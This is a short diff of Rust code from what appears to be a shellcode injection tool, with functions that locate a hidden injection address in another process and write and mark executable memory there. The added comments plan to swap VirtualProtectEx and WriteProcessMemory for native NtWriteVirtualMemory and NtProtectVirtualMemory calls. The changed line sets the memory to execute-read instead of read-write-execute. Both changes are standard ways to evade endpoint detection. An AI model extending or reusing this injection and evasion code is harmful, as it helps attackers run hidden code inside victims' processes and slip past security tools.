@@ -239,6 +239,8 @@ pub fn get_hidden_injection_address(
     Err("No suitable injection location found".to_string())
 }
 
+//replace with NTAPI calls instead of VirtualProtectEx and WriteProcessMemory
+//use NtWriteVirtualMemory and NtProtectVirtualMemory or something equivalent
 pub fn inject_and_rwx(
     process_handle: HANDLE,
     shellcode_location: *mut winapi_c_void,
@@ -284,7 +286,7 @@ pub fn inject_and_rwx(
         return false;
     }
 
-    // Second VirtualProtectEx call to set PAGE_EXECUTE_READWRITE
+    // Second VirtualProtectEx call to set PAGE_EXECUTE_READ
     let success = unsafe {
         VirtualProtectEx(
             process_handle,
